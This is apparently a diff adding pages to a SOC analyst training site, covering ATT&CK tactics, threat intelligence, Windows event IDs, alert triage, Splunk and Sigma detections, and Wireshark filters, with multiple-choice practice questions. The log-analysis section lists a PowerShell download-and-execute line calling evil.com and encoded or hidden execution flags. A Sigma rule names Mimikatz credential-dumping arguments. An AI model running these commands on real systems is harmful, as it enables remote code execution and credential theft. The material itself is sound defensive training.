+            <div class="qbl" id="q-soc1"><div class="qq">A Tier 1 analyst receives: Mimikatz strings detected in memory on WS-042 (Finance workstation). No pentest scheduled. Correct action?</div><div class="qopts"><button class="qo" onclick="QA('q-soc1',0,1)">A. Close as FP — Mimikatz is a common pentesting tool</button><button class="qo" onclick="QA('q-soc1',1,1)">B. Escalate immediately to Tier 2 with all context</button><button class="qo" onclick="QA('q-soc1',2,1)">C. Wait 24 hours to see if more alerts fire</button><button class="qo" onclick="QA('q-soc1',3,1)">D. Contact the end user and ask what they ran</button></div><div class="qfb" id="q-soc1-fb"></div><button class="undoq" id="uq-q-soc1" onclick="UQ('q-soc1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-soc" onclick="MC('soc')">Mark module complete ✓</button><button class="ubtn" id="ub-soc" onclick="UM('soc')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- MITRE ATT&CK -->
+      <div class="page" id="page-mitre">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 1 · Module 05</div><div class="ltit">MITRE ATT&amp;CK Framework</div><div class="lmet">14 tactics · Techniques · Pyramid of Pain · Cyber Kill Chain · APT attribution</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Three complementary frameworks</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">Cyber Kill Chain (Lockheed)</div><div class="ccb">7 linear phases: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives. Useful for understanding attack progression.</div></div>
+              <div class="cc"><div class="cct">MITRE ATT&CK</div><div class="ccb">14 tactics, hundreds of techniques based on real-world threat actor observations. The standard language for describing attacks. Maps TTPs to detection opportunities.</div></div>
+              <div class="cc"><div class="cct">Pyramid of Pain (Bianco)</div><div class="ccb">Shows detection difficulty vs pain to attacker. Bottom = hashes/IPs (easy to change). Top = TTPs (forces complete retool). Detect at TTP level for maximum impact.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">The 14 ATT&CK tactics (memorize these)</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">TA0043 Reconnaissance</div><div class="ccb">Gathering info before the attack: OSINT, scanning, phishing for credentials/info.</div></div>
+              <div class="cc"><div class="cct">TA0001 Initial Access</div><div class="ccb">Getting in: phishing, exploit public apps, valid accounts, supply chain compromise.</div></div>
+              <div class="cc"><div class="cct">TA0002 Execution</div><div class="ccb">Running malicious code: PowerShell, WMI, scheduled tasks, mshta, scripts.</div></div>
+              <div class="cc"><div class="cct">TA0003 Persistence</div><div class="ccb">Surviving reboots: Run keys, scheduled tasks, services, startup folder, DLL hijacking.</div></div>
+              <div class="cc"><div class="cct">TA0004 Privilege Escalation</div><div class="ccb">Gaining higher privileges: UAC bypass, token manipulation, local exploits.</div></div>
+              <div class="cc"><div class="cct">TA0005 Defense Evasion</div><div class="ccb">Avoiding detection: obfuscation, disabling AV, timestomping, LOLBins, clearing logs.</div></div>
+              <div class="cc"><div class="cct">TA0006 Credential Access</div><div class="ccb">Stealing creds: LSASS dumping, Kerberoasting, keylogging, SAM/NTDS.dit access.</div></div>
+              <div class="cc"><div class="cct">TA0007 Discovery</div><div class="ccb">Learning the environment: net commands, BloodHound, ping sweeps, SPN enumeration.</div></div>
+              <div class="cc"><div class="cct">TA0008 Lateral Movement</div><div class="ccb">Moving between hosts: PtH, PsExec, RDP, WMI remote execution, SSH.</div></div>
+              <div class="cc"><div class="cct">TA0009 Collection</div><div class="ccb">Gathering data to exfiltrate: screen capture, clipboard, file staging, email collection.</div></div>
+              <div class="cc"><div class="cct">TA0011 C2</div><div class="ccb">Communicating back: DNS tunneling, HTTPS C2, beaconing, Cobalt Strike, web shells.</div></div>
+              <div class="cc"><div class="cct">TA0010 Exfiltration</div><div class="ccb">Getting data out: C2 channel, cloud storage, encrypted archive, DNS tunneling.</div></div>
+              <div class="cc"><div class="cct">TA0040 Impact</div><div class="ccb">Destroying/disrupting: ransomware, wiper malware, defacement, DoS, data destruction.</div></div>
+              <div class="cc"><div class="cct">TA0042 Resource Dev</div><div class="ccb">Building attack infra: acquiring domains, setting up C2 servers, developing malware.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">APT attribution basics</div>
+            <p class="ltxt">APT (Advanced Persistent Threat) groups are sophisticated, often state-sponsored actors. Attributing activity helps predict future behavior and understand objectives. Attribution is based on TTP overlap, shared infrastructure, malware code reuse, and victimology.</p>
+            <table class="dt"><thead><tr><th>Group</th><th>Origin</th><th>Known for</th></tr></thead><tbody>
+              <tr><td>APT28 (Fancy Bear)</td><td>Russia (GRU)</td><td>Spearphishing, credential harvesting, election interference, X-Agent RAT</td></tr>
+              <tr><td>APT29 (Cozy Bear)</td><td>Russia (SVR)</td><td>SUNBURST supply chain, living-off-the-land, extreme patience and stealth</td></tr>
+              <tr><td>APT41</td><td>China</td><td>Supply chain attacks, dual espionage+financial motivation, Winnti malware</td></tr>
+              <tr><td>Lazarus Group</td><td>North Korea</td><td>WannaCry, SWIFT bank attacks, cryptocurrency theft, destructive wipers</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://mitre-attack.github.io/attack-navigator/" target="_blank">ATT&CK Navigator (Official)</a>
+              <a class="el" href="https://car.mitre.org/analytics/by_technique" target="_blank">MITRE CAR Analytics</a>
+              <a class="el" href="https://tryhackme.com/room/mitre" target="_blank">TryHackMe — MITRE Room</a>
+              <a class="el" href="https://attack.mitre.org/" target="_blank">ATT&CK Matrix</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-m1"><div class="qq">An attacker modifies HKCU\Software\Microsoft\Windows\CurrentVersion\Run to add a malicious entry. Which ATT&CK technique and tactic does this map to?</div><div class="qopts"><button class="qo" onclick="QA('q-m1',0,1)">A. T1059.001 PowerShell — Execution tactic</button><button class="qo" onclick="QA('q-m1',1,1)">B. T1547.001 Registry Run Keys — Persistence tactic</button><button class="qo" onclick="QA('q-m1',2,1)">C. T1003.001 LSASS Memory — Credential Access tactic</button><button class="qo" onclick="QA('q-m1',3,1)">D. T1070.004 File Deletion — Defense Evasion tactic</button></div><div class="qfb" id="q-m1-fb"></div><button class="undoq" id="uq-q-m1" onclick="UQ('q-m1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-mitre" onclick="MC('mitre')">Mark module complete ✓</button><button class="ubtn" id="ub-mitre" onclick="UM('mitre')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- THREAT INTELLIGENCE -->
+      <div class="page" id="page-ti">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 1 · Module 06</div><div class="ltit">Threat Intelligence</div><div class="lmet">IOCs · TI lifecycle · OSINT platforms · MISP · ISACs · PAP/TLP</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Intelligence types</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">Tactical (IOCs)</div><div class="ccb">File hashes, IPs, domains, URLs. Immediately actionable — block or hunt now. Short shelf life: IPs rotate in hours, domains in days.</div></div>
+              <div class="cc"><div class="cct">Operational (TTPs)</div><div class="ccb">How a specific actor operates: tools, techniques, target selection. Longer-lived than IOCs. Maps directly to ATT&CK techniques.</div></div>
+              <div class="cc"><div class="cct">Strategic</div><div class="ccb">High-level for executives: which threat actors target your industry, geopolitical threat drivers, industry risk trends.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">PAP and TLP</div>
+            <p class="ltxt"><strong>TLP (Traffic Light Protocol)</strong> governs information SHARING — who you can share intelligence with. <strong>PAP (Permissible Actions Protocol)</strong> governs what ACTIONS you can take with the intelligence you receive. Both appear on shared threat reports from ISACs and vendors.</p>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">TLP:WHITE / TLP:CLEAR</div><div class="ccb">No restrictions. Can be shared publicly.</div></div>
+              <div class="cc"><div class="cct">TLP:GREEN</div><div class="ccb">Share within your community/sector. Not for public release.</div></div>
+              <div class="cc"><div class="cct">TLP:AMBER</div><div class="ccb">Share only within your organization and directly with need-to-know partners.</div></div>
+              <div class="cc"><div class="cct">TLP:RED</div><div class="ccb">No sharing. For recipient eyes only. Cannot be used in automated systems.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Key OSINT platforms for analysts</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">VirusTotal</div><div class="ccb">Submit hash, IP, domain, or file. 70+ AV engines. Use the Relationships graph to pivot to connected infrastructure and campaigns.</div></div>
+              <div class="cc"><div class="cct">AlienVault OTX</div><div class="ccb">Community TI. Search any IOC to find "pulses" — threat reports linking it to campaigns and threat actors. Subscribe to sector feeds.</div></div>
+              <div class="cc"><div class="cct">abuse.ch</div><div class="ccb">URLhaus (malicious URLs), MalwareBazaar (malware samples), ThreatFox (IOCs), Feodo Tracker (C2 infrastructure). Free API access.</div></div>
+              <div class="cc"><div class="cct">MISP</div><div class="ccb">Open source TI platform for sharing and correlating IOCs within and between organizations. Used by ISACs and national CERTs globally.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://www.virustotal.com" target="_blank">VirusTotal</a>
+              <a class="el" href="https://otx.alienvault.com" target="_blank">AlienVault OTX</a>
+              <a class="el" href="https://abuse.ch" target="_blank">abuse.ch</a>
+              <a class="el" href="https://threatfox.abuse.ch" target="_blank">ThreatFox</a>
+              <a class="el" href="https://tryhackme.com/room/threatinteltools" target="_blank">TryHackMe — Threat Intel Tools</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-ti1"><div class="qq">A hash is malicious on VirusTotal (45/72 detections). You want to understand which campaign it belongs to and find related C2 infrastructure. Best next platform?</div><div class="qopts"><button class="qo" onclick="QA('q-ti1',0,2)">A. Shodan — search for open ports on suspicious IPs</button><button class="qo" onclick="QA('q-ti1',1,2)">B. AlienVault OTX — search the hash for associated pulses and related IOCs</button><button class="qo" onclick="QA('q-ti1',2,2)">C. URLhaus — look for download URLs</button><button class="qo" onclick="QA('q-ti1',3,2)">D. MISP — submit to community</button></div><div class="qfb" id="q-ti1-fb"></div><button class="undoq" id="uq-q-ti1" onclick="UQ('q-ti1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-ti" onclick="MC('ti')">Mark module complete ✓</button><button class="ubtn" id="ub-ti" onclick="UM('ti')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- LOG ANALYSIS -->
+      <div class="page" id="page-logs">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 1 · Module 07</div><div class="ltit">Log Analysis</div><div class="lmet">Windows Event IDs · Linux logs · Web server logs · Suspicious patterns</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Critical Windows Event IDs — memorize these</div>
+            <table class="dt"><thead><tr><th>EID</th><th>Event</th><th>Why it matters</th></tr></thead><tbody>
+              <tr><td>4624</td><td>Successful logon</td><td>Type 3 (network) from unusual source = lateral movement. Type 10 = RDP.</td></tr>
+              <tr><td>4625</td><td>Failed logon</td><td>High frequency = brute force. Same source, many usernames = password spray.</td></tr>
+              <tr><td>4648</td><td>Logon with explicit credentials</td><td>Credential reuse or Pass-the-Hash — process logs on with different creds than logged-in user.</td></tr>
+              <tr><td>4720</td><td>User account created</td><td>Attacker persistence — new account on DC with no change ticket is critical priority.</td></tr>
+              <tr><td>4732</td><td>User added to group</td><td>Especially Domain Admins / Enterprise Admins — unconditional escalation trigger.</td></tr>
+              <tr><td>4688</td><td>Process created</td><td>With command-line logging: reveals LOLBin usage, encoded PS, malicious child processes.</td></tr>
+              <tr><td>4698</td><td>Scheduled task created</td><td>Common persistence mechanism — especially random names or encoded commands.</td></tr>
+              <tr><td>4769</td><td>Kerberos TGS requested</td><td>Mass requests across many SPNs = Kerberoasting.</td></tr>
+              <tr><td>1102</td><td>Security log cleared</td><td>Anti-forensics — always escalate immediately regardless of context.</td></tr>
+              <tr><td>7045</td><td>New service installed</td><td>Persistence/privesc — random names pointing to Temp paths are highly suspicious.</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">Linux forensic log locations</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">/var/log/auth.log</div><div class="ccb">SSH logins, sudo, su. Primary auth source on Debian/Ubuntu. Key strings: "Invalid user", "Failed password", "Accepted publickey from".</div></div>
+              <div class="cc"><div class="cct">/var/log/secure</div><div class="ccb">Same as auth.log on RHEL/CentOS. SSH brute force, failed sudo attempts, PAM module activity.</div></div>
+              <div class="cc"><div class="cct">~/.bash_history</div><div class="ccb">Per-user command history. Absence is suspicious. Look for: wget/curl to IPs, chmod +x, netcat, python -c 'reverse shell' patterns.</div></div>
+              <div class="cc"><div class="cct">/var/log/wtmp + btmp</div><div class="ccb">Login history (last command) and failed logins (lastb). Session timeline including source IPs and durations.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">PowerShell obfuscation indicators</div>
+            <div class="cb"><span class="cm"># Flag these patterns in process creation logs (EID 4688 / Sysmon EID 1)</span>
+powershell.exe -<span class="kw">enc</span> JABzAGUAcgB2AGUAcgAgAD0A...   <span class="cm"># Base64 encoded payload</span>
+powershell.exe -<span class="kw">NonInteractive</span> -<span class="kw">WindowStyle Hidden</span>  <span class="cm"># Hidden execution</span>
+powershell.exe -<span class="kw">ExecutionPolicy Bypass</span> -<span class="kw">NoProfile</span>     <span class="cm"># Bypass all defenses</span>
+IEX (New-Object Net.WebClient).<span class="kw">DownloadString</span>(<span class="st">'http://evil.com/s.ps1'</span>) <span class="cm"># Download+execute</span>
+[System.Convert]::<span class="kw">FromBase64String</span>(<span class="st">"..."</span>)              <span class="cm"># Inline decode</span></div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/" target="_blank">Windows Security Log Encyclopedia</a>
+              <a class="el" href="https://detection.fyi" target="_blank">detection.fyi</a>
+              <a class="el" href="https://0xmedhat.gitbook.io/whoami/detect-ad-attacks" target="_blank">Detect AD Attacks (0xmedhat)</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-l1"><div class="qq">You see 847 EID 4625 events: different username each time, 1–2 failures per account, from one source IP, over 30 minutes. What attack is this?</div><div class="qopts"><button class="qo" onclick="QA('q-l1',0,2)">A. Brute force against a single account</button><button class="qo" onclick="QA('q-l1',1,2)">B. Password spraying — one password against many accounts to avoid lockout</button><button class="qo" onclick="QA('q-l1',2,2)">C. Pass-the-Hash lateral movement</button><button class="qo" onclick="QA('q-l1',3,2)">D. Credential stuffing from a breached database</button></div><div class="qfb" id="q-l1-fb"></div><button class="undoq" id="uq-q-l1" onclick="UQ('q-l1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-logs" onclick="MC('logs')">Mark module complete ✓</button><button class="ubtn" id="ub-logs" onclick="UM('logs')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- ALERT MANAGEMENT -->
+      <div class="page" id="page-alerts">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 1 · Module 08</div><div class="ltit">Alert Management &amp; Triage</div><div class="lmet">Triage workflow · FP vs TP · Multi-alert correlation · Documentation</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">6-step triage workflow</div>
+            <div class="steps">
+              <div class="si"><div class="sn">1</div><div><div class="stit2">Receive alert</div><div class="sdesc">Alert fires in SIEM, ticket auto-opens in TheHive or Jira. Never dismiss without investigation — even if it looks like noise.</div></div></div>
+              <div class="si"><div class="sn">2</div><div><div class="stit2">Gather context</div><div class="sdesc">Who is the user? What asset? What time? How often has this rule fired before on this asset in the past 30 days?</div></div></div>
+              <div class="si"><div class="sn">3</div><div><div class="stit2">Enrich</div><div class="sdesc">OSINT the IPs/domains/hashes on VirusTotal and OTX. Check asset inventory and user's recent activity history in the SIEM.</div></div></div>
+              <div class="si"><div class="sn">4</div><div><div class="stit2">Correlate</div><div class="sdesc">Are there other alerts on the same host/user in the same time window? One alert = possible noise. Three correlated alerts = pattern.</div></div></div>
+              <div class="si"><div class="sn">5</div><div><div class="stit2">Decide</div><div class="sdesc">FP: close with written explanation of WHY. TP: escalate to Tier 2 with all enrichment and correlation data attached.</div></div></div>
+              <div class="si"><div class="sn">6</div><div><div class="stit2">Document</div><div class="sdesc">Every decision needs a written record. Your notes protect you legally, enable shift handover, and build institutional knowledge.</div></div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Worked examples</div>
+            <div class="asi"><div class="asev lo"></div><div><div class="anm">Port scan — src 10.0.0.45</div><div class="adet">10.0.0.45 = documented vulnerability scanner. Scheduled scan every Tuesday 02:00. Pattern matches documented baseline.</div><span class="avd afp">False positive — close with note</span></div></div>
+            <div class="asi"><div class="asev hi"></div><div><div class="anm">Mimikatz in memory — WS-042</div><div class="adet">Finance workstation. No pentest scheduled. No legitimate reason for credential-dumping tool to be present in process memory.</div><span class="avd atp">True positive — escalate immediately</span></div></div>
+            <div class="asi"><div class="asev md"></div><div><div class="anm">47 failed logins then success — j.smith from Tor exit node</div><div class="adet">47 failures in 3 min from 185.220.x.x (known Tor exit), 1 success from same IP. j.smith is a Finance user.</div><span class="avd aec">Escalate — likely account compromise</span></div></div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-al1"><div class="qq">Within 8 minutes on WS-017: phishing email opened → mshta.exe spawned by outlook.exe → LSASS memory access → SMB connection to SRV-003. What is the correct assessment?</div><div class="qopts"><button class="qo" onclick="QA('q-al1',0,2)">A. Each alert is likely a separate false positive</button><button class="qo" onclick="QA('q-al1',1,2)">B. Correlated attack chain — escalate as active incident immediately</button><button class="qo" onclick="QA('q-al1',2,2)">C. Wait for more evidence before escalating</button><button class="qo" onclick="QA('q-al1',3,2)">D. Only the LSASS alert needs escalation</button></div><div class="qfb" id="q-al1-fb"></div><button class="undoq" id="uq-q-al1" onclick="UQ('q-al1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-alerts" onclick="MC('alerts')">Mark module complete ✓</button><button class="ubtn" id="ub-alerts" onclick="UM('alerts')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+      <!-- SIEM -->
+      <div class="page" id="page-siem">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 2 · Module 09</div><div class="ltit">SIEM &amp; Detection Engineering</div><div class="lmet">Splunk SPL · KQL · Sigma rules · Detection rules · Alert tuning · Dashboards</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Splunk SPL essentials</div>
+            <div class="cb"><span class="cm">| Brute force detection — tuned with exclusions and time bucketing</span>
+<span class="kw">index</span>=windows <span class="kw">EventCode</span>=<span class="vl">4625</span>
+  <span class="kw">NOT</span> src_ip IN (<span class="vl">10.0.1.5</span>, <span class="vl">10.0.1.6</span>)   <span class="cm">| exclude helpdesk IPs</span>
+  <span class="kw">NOT</span> user IN (<span class="vl">svc_backup</span>, <span class="vl">svc_monitor</span>)
+| <span class="kw">bucket</span> _time <span class="kw">span</span>=<span class="vl">5m</span>
+| <span class="kw">stats count</span> by _time, src_ip, user
+| <span class="kw">where</span> count > <span class="vl">10</span>
+
+<span class="cm">| Hunt for encoded PowerShell (-enc / -EncodedCommand)</span>
+<span class="kw">index</span>=windows <span class="kw">EventCode</span>=<span class="vl">4688</span>
+  CommandLine=<span class="st">"* -enc *"</span> OR CommandLine=<span class="st">"* -EncodedCommand *"</span>
+| <span class="kw">table</span> _time, host, User, CommandLine, ParentProcessName
+| <span class="kw">sort</span> -_time
+
+<span class="cm">| IOC hunt — search for malicious IP across all log sources</span>
+<span class="kw">index</span>=* (<span class="st">"185.220.101.45"</span> OR <span class="st">"185.220.101.46"</span>)
+| <span class="kw">stats count</span> by host, sourcetype, _time
+| <span class="kw">sort</span> -_time</div>
+          </div>
+          <div class="lsec"><div class="lsect">Sigma rules — platform-agnostic detection</div>
+            <p class="ltxt"><strong>Sigma</strong> is a generic signature format: write once, convert to SPL, KQL, Elasticsearch, or any SIEM. The exam tests your ability to read and interpret Sigma rules. Key fields: <code style="color:var(--cy)">detection.selection</code> defines what to match, <code style="color:var(--cy)">condition</code> applies logic, <code style="color:var(--cy)">logsource</code> specifies the data source.</p>
+            <div class="cb"><span class="cm"># Sigma rule — Mimikatz detection via process name / arguments</span>
+title: <span class="vl">Mimikatz Credential Dumping</span>
+status: stable
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: <span class="st">'\mimikatz.exe'</span>
+    CommandLine|contains:
+      - <span class="st">'sekurlsa'</span>
+      - <span class="st">'lsadump'</span>
+      - <span class="st">'privilege::debug'</span>
+  condition: selection
+level: critical
+tags:
+  - attack.credential_access
+  - attack.t1003.001</div>
+          </div>
+          <div class="lsec"><div class="lsect">Alert tuning principles</div>
+            <div class="tunl">
+              <div class="tui"><span class="tri trl">low risk</span><div><div class="tuit">Exclude specific known-good IPs</div><div class="tuid">Precise, documented, easy to review. Revisit if the IP changes ownership or role.</div></div></div>
+              <div class="tui"><span class="tri trm">medium risk</span><div><div class="tuit">Exclude entire subnets</div><div class="tuid">Only acceptable with a compensating detection covering that subnet. Document the compensating control.</div></div></div>
+              <div class="tui"><span class="tri trh">never do this</span><div><div class="tuit">Exclude privileged accounts to reduce noise</div><div class="tuid">Attackers target exactly these accounts. Suppressing Domain Admins creates a fatal blind spot in the most critical targets.</div></div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Watch: Wazuh SIEM event monitoring</div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=Hq58_yGJwHk" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.8</div><div class="vtit">Introduction To Wazuh SIEM</div><div class="vdesc">Covers the full SIEM pipeline: log collection, normalization, correlation rules, alert generation, and dashboard creation. Maps directly to the BTL1 SIEM module. Follow along in a free lab environment.</div><a class="vlink" href="https://www.youtube.com/watch?v=Hq58_yGJwHk" target="_blank">Watch on YouTube →</a></div></div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://blog.zsec.uk/ltr-d101-splunk/" target="_blank">Splunk SPL Blog (zsec.uk)</a>
+              <a class="el" href="https://github.com/splunk/botsv3" target="_blank">BOTSV3 Splunk CTF Dataset</a>
+              <a class="el" href="https://github.com/ChickenLoner/Awesome-Splunk-and-Elastic-SIEM-Practice-Labs" target="_blank">Awesome Splunk/Elastic Labs</a>
+              <a class="el" href="https://github.com/SigmaHQ/sigma" target="_blank">SigmaHQ Rules Repository</a>
+              <a class="el" href="https://research.splunk.com/detections/" target="_blank">Splunk Detection Research</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-si1"><div class="qq">A brute force rule fires 500 times/day and 490 are from the IT helpdesk IP (10.0.1.5). What is the correct tuning action?</div><div class="qopts"><button class="qo" onclick="QA('q-si1',0,2)">A. Disable the rule — it is too noisy</button><button class="qo" onclick="QA('q-si1',1,2)">B. Add 10.0.1.5 as a documented exclusion and monitor the remaining 10 alerts</button><button class="qo" onclick="QA('q-si1',2,2)">C. Raise the threshold to 1000 failures before alerting</button><button class="qo" onclick="QA('q-si1',3,2)">D. Exclude all internal IPs from the rule</button></div><div class="qfb" id="q-si1-fb"></div><button class="undoq" id="uq-q-si1" onclick="UQ('q-si1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-siem" onclick="MC('siem')">Mark module complete ✓</button><button class="ubtn" id="ub-siem" onclick="UM('siem')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- NETWORK SECURITY -->
+      <div class="page" id="page-network">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 2 · Module 10</div><div class="ltit">Network Security Monitoring</div><div class="lmet">Wireshark · PCAP analysis · C2 detection · DNS tunneling · Lateral movement</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Wireshark display filters for analysts</div>
+            <div class="cb"><span class="cm">// Protocol filters — start broad, then narrow</span>
+http    dns    smb    ftp    ssh    tls
+
+<span class="cm">// Filter by IP address</span>
+ip.addr == <span class="vl">192.168.1.100</span>
+ip.src == <span class="vl">10.0.0.5</span> && ip.dst == <span class="vl">185.220.101.45</span>
+
+<span class="cm">// Detect large POST requests — possible data exfiltration</span>
+http.request.method == <span class="st">"POST"</span> && http.content_length > <span class="vl">1000</span>
+
+<span class="cm">// DNS tunneling indicator — unusually long query names (>50 chars)</span>
+dns.qry.name.len > <span class="vl">50</span>
+
+<span class="cm">// Find all SYN packets to a specific destination (beaconing detection)</span>
+tcp.flags.syn == <span class="vl">1</span> && ip.dst == <span class="vl">185.220.101.45</span>
+
+<span class="cm">// SMB lateral movement — connections to admin shares</span>
+smb.path contains <span class="st">"ADMIN$"</span> OR smb.path contains <span class="st">"C$"</span></div>
+          </div>
+          <div class="lsec"><div class="lsect">Suspicious traffic patterns to recognize</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">C2 Beaconing</div><div class="ccb">Regular-interval connections to the same destination. Machine-automated = perfectly regular timing (e.g. exactly every 60s). Human browsing is irregular. Timing regularity is the key detection signal.</div></div>
+              <div class="cc"><div class="cct">DNS Tunneling</div><div class="ccb">Data encoded as base64 subdomain labels: "aGVsbG8gd29ybGQ.evil.com". Indicators: query names >50 chars, high frequency, base64 charset in subdomains, replies with TXT records containing encoded data.</div></div>
+              <div class="cc"><div class="cct">Data Exfiltration</div><div class="ccb">Large outbound transfers to unusual destinations. HTTPS to IP addresses (not domain names) is suspicious — most legitimate cloud services use hostnames. Look for unusual volume at unusual times.</div></div>
+              <div class="cc"><div class="cct">SMB Lateral Movement</div><div class="ccb">Workstation-to-workstation SMB connections to ADMIN$ or C$. Normal workstations should not connect directly to each other via SMB — only to file servers.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Watch: Wireshark filters and HTTPS decryption</div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=-y_ObCrHB0g" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.5</div><div class="vtit">Wireshark Display &amp; Capture Filters</div><div class="vdesc">Master both Wireshark filter types: capture filters (what gets recorded) and display filters (what you find in a PCAP). Essential skill for every analyst investigating network incidents. Includes practical examples for C2 and exfiltration detection.</div><a class="vlink" href="https://www.youtube.com/watch?v=-y_ObCrHB0g" target="_blank">Watch on YouTube →</a></div></div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=a9eVf2uleaA" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.6</div><div class="vtit">Decrypting HTTPS Traffic With Wireshark</div><div class="vdesc">Use TLS session keys to decrypt HTTPS traffic in Wireshark — critical for investigating C2 over HTTPS, malware downloading encrypted payloads, and exfiltration over TLS. A skill that separates junior from mid-level analysts.</div><a class="vlink" href="https://www.youtube.com/watch?v=a9eVf2uleaA" target="_blank">Watch on YouTube →</a></div></div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://malware-traffic-analysis.net/" target="_blank">Malware Traffic Analysis (real PCAPs)</a>
+              <a class="el" href="https://wiki.wireshark.org/SampleCaptures" target="_blank">Wireshark Sample Captures</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-nw1"><div class="qq">A workstation makes DNS queries every 60 seconds to "aGVsbG8gd29ybGQ.evil.com" and "dGhpcyBpcyBhIHRlc3Q.evil.com". What attack pattern is this?</div><div class="qopts"><button class="qo" onclick="QA('q-nw1',0,2)">A. Normal CDN load balancing behavior</button><button class="qo" onclick="QA('q-nw1',1,2)">B. DNS tunneling — base64-encoded data in subdomains with regular C2 beaconing interval</button><button class="qo" onclick="QA('q-nw1',2,2)">C. DGA (Domain Generation Algorithm) activity</button><button class="qo" onclick="QA('q-nw1',3,2)">D. Legitimate software auto-update checks</button></div><div class="qfb" id="q-nw1-fb"></div><button class="undoq" id="uq-q-nw1" onclick="UQ('q-nw1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-network" onclick="MC('network')">Mark module complete ✓</button><button class="ubtn" id="ub-network" onclick="UM('network')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- IDS -->
+      <div class="page" id="page-ids">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 2 · Module 11</div><div class="ltit">IDS: Snort &amp; Suricata</div><div class="lmet">Rule writing · Signature detection · Anomaly detection · Alert analysis</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">IDS vs IPS</div>
